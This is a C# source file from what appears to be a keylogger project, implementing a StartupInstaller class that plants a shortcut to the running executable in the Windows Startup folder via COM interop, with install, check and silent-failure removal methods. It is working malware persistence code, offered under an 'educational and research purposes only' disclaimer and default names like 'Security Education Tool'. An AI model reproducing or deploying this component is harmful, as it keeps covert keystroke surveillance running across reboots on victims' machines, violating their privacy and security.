using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

namespace Keylogger.Persistence.Startup
{
    /// <summary>
    /// Provides functionality for installing and removing startup persistence
    /// For educational and research purposes only
    /// </summary>
    public class StartupInstaller
    {
        // COM interfaces needed for Windows Script Host functionality
        [ComImport]
        [Guid("00021401-0000-0000-C000-000000000046")]
        private class ShellLink { }

        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        [Guid("000214F9-0000-0000-C000-000000000046")]
        private interface IShellLink
        {
            void GetPath([Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pszFile, int cchMaxPath, out IntPtr pfd, int fFlags);
            void GetIDList(out IntPtr ppidl);
            void SetIDList(IntPtr pidl);
            void GetDescription([Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pszName, int cchMaxName);
            void SetDescription([MarshalAs(UnmanagedType.LPWStr)] string pszName);
            void GetWorkingDirectory([Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pszDir, int cchMaxPath);
            void SetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr)] string pszDir);
            void GetArguments([Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pszArgs, int cchMaxPath);
            void SetArguments([MarshalAs(UnmanagedType.LPWStr)] string pszArgs);
            void GetHotkey(out short pwHotkey);
            void SetHotkey(short wHotkey);
            void GetShowCmd(out int piShowCmd);
            void SetShowCmd(int iShowCmd);
            void GetIconLocation([Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pszIconPath, int cchIconPath, out int piIcon);
            void SetIconLocation([MarshalAs(UnmanagedType.LPWStr)] string pszIconPath, int iIcon);
            void SetRelativePath([MarshalAs(UnmanagedType.LPWStr)] string pszPathRel, int dwReserved);
            void Resolve(IntPtr hwnd, int fFlags);
            void SetPath([MarshalAs(UnmanagedType.LPWStr)] string pszFile);
        }

        private readonly string _applicationName;
        private readonly string _applicationDescription;

        /// <summary>
        /// Initializes a new instance of the StartupInstaller class
        /// </summary>
        /// <param name="applicationName">The name of the application for the startup shortcut</param>
        /// <param name="applicationDescription">The description for the startup shortcut</param>
        public StartupInstaller(string applicationName, string applicationDescription)
        {
            _applicationName = !string.IsNullOrWhiteSpace(applicationName) 
                ? applicationName 
                : "SecurityEducation";
                
            _applicationDescription = !string.IsNullOrWhiteSpace(applicationDescription) 
                ? applicationDescription 
                : "Security Education Tool";
        }

        /// <summary>
        /// Gets the path to the Windows Startup folder
        /// </summary>
        public string StartupFolderPath => Environment.GetFolderPath(Environment.SpecialFolder.Startup);

        /// <summary>
        /// Gets the path to the shortcut file in the Windows Startup folder
        /// </summary>
        public string StartupShortcutPath => Path.Combine(StartupFolderPath, $"{_applicationName}.lnk");

        /// <summary>
        /// Checks if the persistence mechanism is installed
        /// </summary>
        /// <returns>True if persistence is installed, otherwise false</returns>
        public bool IsPersistenceInstalled()
        {
            return File.Exists(StartupShortcutPath);
        }

        /// <summary>
        /// Installs the application for startup persistence
        /// </summary>
        /// <returns>True if installation was successful, otherwise false</returns>
        public bool InstallForPersistence()
        {
            try
            {
                string appPath = Assembly.GetExecutingAssembly().Location;
                
                // Create a shortcut in the startup folder using COM interop
                IShellLink link = (IShellLink)new ShellLink();
                link.SetPath(appPath);
                link.SetWorkingDirectory(Path.GetDirectoryName(appPath));
                link.SetDescription(_applicationDescription);
                
                // Save the shortcut
                IPersistFile file = (IPersistFile)link;
                file.Save(StartupShortcutPath, false);
                
                return true;
            }
            catch (Exception)
            {
                // Fail silently for research purposes
                return false;
            }
        }

        /// <summary>
        /// Removes startup persistence
        /// </summary>
        /// <returns>True if removal was successful, otherwise false</returns>
        public bool RemovePersistence()
        {
            try
            {
                if (File.Exists(StartupShortcutPath))
                {
                    File.Delete(StartupShortcutPath);
                    return true;
                }
                
                return false;
            }
            catch (Exception)
            {
                // Fail silently for research purposes
                return false;
            }
        }
    }
}